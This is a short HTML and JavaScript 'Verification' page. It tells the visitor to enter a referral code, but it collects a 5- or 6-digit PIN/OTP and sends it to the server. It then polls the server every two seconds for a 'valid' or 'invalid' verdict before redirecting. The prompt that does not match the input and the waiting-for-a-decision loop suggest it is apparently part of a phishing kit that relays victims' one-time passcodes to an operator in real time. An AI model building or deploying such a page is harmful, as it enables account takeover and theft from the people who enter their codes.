<!DOCTYPE html>
<html>

<head>
    <title>Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Verification</h2>

    <!-- 🔄 LOADER -->
    <div class="loader"></div>

    <p style="text-align:center; margin-top:15px;">
    Please enter your referral code below to continue.
</p>

    <!-- 🔢 OTP BOXES -->
    <div id="otpBoxes" style="display:flex; justify-content:center; gap:10px; margin-top:20px;"></div>

    <!-- BUTTON -->
    <button class="login-btn" onclick="submitOTP()">Continue</button>

</div>

<div class="footer"></div>

<script>
// get OTP length (5 or 6)
const length = localStorage.getItem("otpLength") || 5;

const container = document.getElementById("otpBoxes");

fetch("/clear-decision", { method: "POST" });

// create boxes dynamically
for (let i = 0; i < length; i++) {
    const input = document.createElement("input");
    input.type = "text";
    input.maxLength = 1;
    input.className = "pin-box";

    input.style.width = "45px";
    input.style.height = "45px";
    input.style.textAlign = "center";
    input.style.fontSize = "18px";
    input.style.border = "1px solid #ccc";
    input.style.borderRadius = "5px";

    container.appendChild(input);
}

// auto move between inputs
const inputs = document.querySelectorAll(".pin-box");

inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        if (input.value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });
});

// submit OTP
async function submitOTP() {
    let otp = "";

    inputs.forEach(input => {
        otp += input.value;
    });

    if (otp.length != length) {
        alert("Enter full PIN");
        return;
    }

    console.log("PIN ENTERED:", otp);

    // ✅ SEND OTP TO SERVER
    const res = await fetch("/submit-otp", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ otp })
    });

    const data = await res.json();

    if (data.success) {
        alert("PIN submitted. Waiting for verification...");
    } else {
        alert("Error submitting PIN");
    }
}
setInterval(async () => {
  const res = await fetch("/decision-status");
  const data = await res.json();

  if (data.decision === "valid") {
    window.location.href = "/dashboard.html";
  }

  if (data.decision === "invalid") {
    alert("Invalid OTP. Try again.");
  }
}, 2000);

</script>

</body>
</html>
